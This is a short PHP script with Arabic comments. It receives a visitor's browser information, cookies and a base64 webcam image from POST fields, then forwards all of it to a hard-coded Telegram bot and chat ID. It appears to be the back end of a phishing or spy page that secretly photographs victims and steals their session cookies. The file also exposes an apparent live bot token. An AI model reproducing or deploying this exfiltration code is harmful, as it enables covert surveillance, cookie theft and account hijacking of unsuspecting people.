<?php
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

// استقبال البيانات
$img = $_POST['img'];
$info = $_POST['info'];
$cookies = $_POST['cookies'];

// إرسال البيانات النصية
if (!empty($info)) {
    $text = "بيانات المتصفح:\n" . $info . "\n\nالكوكيز:\n" . $cookies;
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));
}

// إرسال الصورة
if (!empty($img)) {
    $filteredData = substr($img, strpos($img, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $tempFileName = 'cam_' . time() . '.png';
    file_put_contents($tempFileName, $unencodedData);

    $postFields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($tempFileName))];
    $ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    unlink($tempFileName);
}
?>
